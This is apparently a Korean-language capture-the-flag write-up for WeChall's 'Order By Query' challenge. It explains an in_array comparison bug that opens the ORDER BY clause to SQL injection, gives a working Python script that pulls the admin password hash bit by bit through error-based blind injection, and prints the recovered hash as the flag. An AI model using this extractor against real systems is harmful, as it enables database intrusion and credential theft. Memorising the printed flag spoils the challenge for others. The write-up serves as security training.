# [WeChall] Order By Query - Writeup

### 1. SQL Injection 포인트는 `by` 파라미터다.

`in_array` 함수의 버그로 인해 맨 앞의 숫자만 일치하면, 그 다음은 문자열이 들어와도 참이 된다.

즉, `Order By` 절에 SQLi가 가능하다.

___

### 2. Error Based SQL Injection을 사용한다.

서브쿼리로 `password`를 가져와서 `if`문으로 참, 거짓을 구분한다.

그리고 참이면 `1`을 반환하고, 거짓이면 `(select 1 union select 2)`를 반환해서 에러를 내서 출력 값을 기준으로 구분해준다.

___

### 3. 알아내야 하는 값은 md5 해시된 값이다.

즉, `[0-9a-f]{32}` 포맷이기에 한 글자당 4번의 쿼리 전송으로 추출이 가능하다.

___

``` python
import urllib.parse, urllib.request

SESSION = '**secret**';

def inject(a, b):
	url = 'http://www.wechall.net/challenge/order_by_query/index.php?by=1,if('\
			'mid(lpad(conv(mid((select+password+from+users+where+username=0x41646D696E+limit+1),' + str(a + 1) + ',1),16,2),4,0),' + str(b + 1) + ',1)=0x31' \
		',1,(select+1+union+select+2))+DESC+limit+1%23'
	headers = {
		'Cookie':'WC=' + SESSION
	}

	req = urllib.request.Request(url, None, headers)
	res = str(urllib.request.urlopen(req).read())

	if 'Aaron A Aaronson' in res:
		return '1'
	else:
		return '0'

def main():
	pw = ''
	for a in range(0, 32):

		temp = ''
		for b in range(0, 4):
			temp += inject(a, b)

		pw += hex(int(temp, 2))[2:].upper()
		print('Password:', pw)

if __name__ == '__main__':
	main()
```
```
Password: 3C3CBEB0C8ADC66F2922C65E7784BE14
```

___

## Answer

flag: `3C3CBEB0C8ADC66F2922C65E7784BE14`